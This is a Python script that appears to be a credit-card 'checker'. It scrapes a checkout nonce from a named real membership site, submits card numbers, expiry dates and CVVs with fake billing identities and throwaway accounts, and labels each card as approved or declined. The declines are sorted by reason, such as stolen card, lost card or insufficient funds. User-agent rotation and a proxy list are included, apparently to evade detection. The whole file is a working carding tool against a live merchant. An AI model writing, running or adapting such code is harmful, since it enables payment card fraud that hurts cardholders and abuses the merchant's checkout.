import httpx
import random
import asyncio
import string

def get_str(text, start, stop):
    try:
        x = text.split(start)[1]
        z = x.split(stop)[0]
        return z
    except IndexError:
        return None

def generate_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_cvv(is_amex=False):
    length = 4 if is_amex else 3
    return ''.join(random.choices(string.digits, k=length)).zfill(length)

# Fixed proxy list - empty means no proxy (direct connection)
proxy_list = [""]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

async def check(card, proxy_url, process_id):
    try:
        cc, mes, ano, original_cvv = map(str.strip, card.split("|"))
        is_amex = cc.startswith("3")
        cvv = original_cvv
        agent = random.choice(USER_AGENTS)
        generate = generate_string(8)

        # Normalize year
        if len(ano) == 2:
            ano = f"20{ano}"

        # Setup HTTPX client - no proxy if empty string
        client_kwargs = {
            "timeout": 45,
            "follow_redirects": True,
            "verify": False
        }
        
        async with httpx.AsyncClient(**client_kwargs) as client:
            headers = {
                "authority": "bli-us.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://bli-us.com",
                "referer": "https://bli-us.com/membership-account/membership-checkout/?level=78",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": agent
            }

            # Get nonce from checkout page
            try:
                response = await client.get(
                    "https://bli-us.com/membership-account/membership-checkout/?level=78", 
                    headers=headers
                )
            except Exception as e:
                return f"Process {process_id}: Error - Connection failed: {str(e)[:30]}"
            
            if response.status_code != 200:
                return f"Process {process_id}: Error - Site returned {response.status_code}"
            
            nonce = get_str(response.text, 'name="pmpro_checkout_nonce" value="', '"')
            if not nonce:
                nonce = get_str(response.text, "pmpro_checkout_nonce", 'value="')
                if nonce:
                    nonce = get_str(nonce + 'value="', 'value="', '"')
            
            if not nonce:
                return f"Process {process_id}: Error - Could not extract nonce"

            data = {
                "pmpro_level": "78",
                "checkjavascript": "1",
                "pmpro_other_discount_code": "",
                "username": f"user{generate}",
                "password": "SecurePass123!",
                "password2": "SecurePass123!",
                "bemail": f"user{generate}@gmail.com",
                "bconfirmemail": f"user{generate}@gmail.com",
                "fullname": "",
                "bfirstname": "John",
                "blastname": "Smith",
                "baddress1": "123 Main Street",
                "baddress2": "",
                "bcity": "New York",
                "bstate": "NY",
                "bzipcode": "10001",
                "bcountry": "US",
                "bphone": "2125551234",
                "CardType": "Amex" if is_amex else ("Mastercard" if cc.startswith("5") else "Visa"),
                "AccountNumber": cc,
                "ExpirationMonth": mes.zfill(2),
                "ExpirationYear": ano,
                "CVV": cvv,
                "pmpro_discount_code": "",
                "pmpro_checkout_nonce": nonce.strip(),
                "_wp_http_referer": "/membership-account/membership-checkout/?level=78",
                "submit-checkout": "1",
                "javascriptok": "1",
            }

            try:
                response = await client.post(
                    "https://bli-us.com/membership-account/membership-checkout/?level=78", 
                    headers=headers, 
                    data=data
                )
            except Exception as e:
                return f"Process {process_id}: Error - Checkout failed: {str(e)[:30]}"
            
            response_text = response.text
            response_lower = response_text.lower()
            
            # Check for success patterns
            if "thank you for your membership" in response_lower or "confirmation" in response_lower:
                return f"Process {process_id}: Approved - Payment successful"
            
            # Extract error message from pmpro_message div
            if "pmpro_message pmpro_error" in response_text:
                error_msg = get_str(response_text, 'pmpro_message pmpro_error">', '</div>')
                if error_msg:
                    error_msg = error_msg.strip()
                    # Clean up HTML tags
                    error_msg = error_msg.replace("<p>", "").replace("</p>", "").replace("<strong>", "").replace("</strong>", "")
                    return f"Process {process_id}: {error_msg[:100]}"
            
            # Check for common decline patterns
            if "do_not_honor" in response_lower or "do not honor" in response_lower:
                return f"Process {process_id}: Declined - Do Not Honor"
            elif "card_declined" in response_lower or "card declined" in response_lower:
                return f"Process {process_id}: Declined - Card Declined"
            elif "insufficient_funds" in response_lower or "insufficient funds" in response_lower:
                return f"Process {process_id}: Declined - Insufficient Funds"
            elif "invalid_cvc" in response_lower or "security code" in response_lower or "cvv" in response_lower:
                return f"Process {process_id}: Declined - Invalid CVV"
            elif "expired" in response_lower:
                return f"Process {process_id}: Declined - Card Expired"
            elif "lost_card" in response_lower or "lost card" in response_lower:
                return f"Process {process_id}: Declined - Lost Card"
            elif "stolen_card" in response_lower or "stolen card" in response_lower:
                return f"Process {process_id}: Declined - Stolen Card"
            elif "pickup_card" in response_lower or "pick up" in response_lower:
                return f"Process {process_id}: Declined - Pick Up Card"
            elif "fraudulent" in response_lower:
                return f"Process {process_id}: Declined - Fraudulent"
            elif "invalid" in response_lower:
                return f"Process {process_id}: Declined - Invalid Card"
            elif "restricted" in response_lower:
                return f"Process {process_id}: Declined - Restricted Card"
            elif "try again" in response_lower:
                return f"Process {process_id}: Declined - Try Again Later"
            elif "error" in response_lower:
                return f"Process {process_id}: Declined - Processing Error"
            else:
                # Return a portion of the page for debugging
                return f"Process {process_id}: Declined - Unknown Response"

    except httpx.TimeoutException:
        return f"Process {process_id}: Error - Request Timeout"
    except Exception as e:
        return f"Process {process_id}: Error - {str(e)[:50]}"
